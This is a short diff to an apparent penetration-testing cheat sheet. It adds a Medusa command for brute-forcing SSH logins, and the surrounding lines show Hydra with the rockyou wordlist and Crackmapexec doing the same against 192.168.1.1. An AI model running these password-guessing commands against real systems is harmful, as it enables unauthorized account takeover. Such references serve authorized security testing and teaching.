@@ -19,6 +19,11 @@ $ hydra -e nsr -l username -P /usr/share/wordlists/rockyou.txt 192.168.1.1 ssh
 "-e nsr" = try "n" null password, "s" login as pass and/or "r" reversed login
 ```
 
+###### Bruteforcing with Medusa
+```
+$ medusa -h 192.168.1.1 -u username -P ./list -M ssh
+```
+
 ###### Bruteforcing with Crackmapexec
 ```
 $ crackmapexec ssh 192.168.1.1 -u users.txt -p passwords.txt
